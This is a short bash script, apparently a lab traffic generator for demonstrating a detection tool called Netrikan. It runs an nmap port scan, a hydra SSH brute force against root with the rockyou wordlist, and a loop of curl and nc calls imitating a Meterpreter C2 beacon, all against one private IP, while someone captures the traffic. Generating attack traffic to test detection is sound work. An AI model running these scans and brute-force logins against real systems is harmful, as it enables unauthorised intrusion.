#!/bin/bash
TARGET="10.50.45.35"

echo "============================================"
echo " Netrikan Demo Attack Script"
echo " Target: $TARGET"
echo "============================================"

echo ""
echo "[1/3] Port scan — InitialAccess"
nmap -sS -T4 -p 21,22,23,25,80,443,445,3389,3306,8080,8443,1433 "$TARGET"

echo ""
echo "[2/3] SSH brute force — InitialAccess (20s)"
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 16 -w 2 ssh://"$TARGET" 2>/dev/null &
HPID=$!
sleep 20
kill $HPID 2>/dev/null
echo "[*] Brute force done"

echo ""
echo "[3/3] Meterpreter C2 beacon — Botnet (30s)"
END=$((SECONDS+30))
SEQ=1
while [ $SECONDS -lt $END ]; do
  curl -s --max-time 2 "http://$TARGET:8080/gate.php?id=mtr_$(hostname)&seq=$SEQ" > /dev/null 2>&1
  curl -s --max-time 2 "http://$TARGET:4444/stage2" > /dev/null 2>&1
  nc -z -w1 "$TARGET" 4444 2>/dev/null
  nc -z -w1 "$TARGET" 4445 2>/dev/null
  SEQ=$((SEQ+1))
  sleep 2
done

echo ""
echo "[*] Done — tell Padmesh to stop capture"
